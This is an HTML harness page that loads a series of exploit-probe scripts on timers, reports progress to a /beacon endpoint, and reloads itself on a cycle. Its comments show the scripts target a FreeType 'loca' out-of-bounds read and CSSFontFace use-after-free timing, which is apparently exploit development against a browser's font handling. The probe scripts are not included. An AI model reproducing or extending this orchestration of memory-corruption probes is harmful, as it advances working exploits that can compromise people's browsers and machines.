<!doctype html><html><head><meta charset="utf-8"><title>v90</title>
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
</head><body>
<script>
new Image().src = '/beacon/V90-BOOT?t=' + Date.now();

function loadScript(src, delay) {
  setTimeout(function() {
    var s = document.createElement('script');
    s.src = src + '?t=' + Date.now();
    s.onerror = function() {
      new Image().src = '/beacon/V90-MISS-' + src.split('/').pop() + '?t=' + Date.now();
    };
    document.body.appendChild(s);
  }, delay);
}

// p275: controlled OOB loca (proves FreeType reads from loca offset)
loadScript('p275-loca-oob-controlled.js', 0);
// p276: offset sweep (tests if different offsets produce different patterns)
loadScript('p276-loca-offset-sweep.js', 12000);
// p270: CSSFontFace timing (UAF vectors)
loadScript('p270-cssfontface-timing.js', 25000);

setTimeout(function() {
  new Image().src = '/beacon/V90-ALL-LOADED?t=' + Date.now();
}, 35000);
setTimeout(function() { location.reload(); }, 120000);
</script>
</body></html>
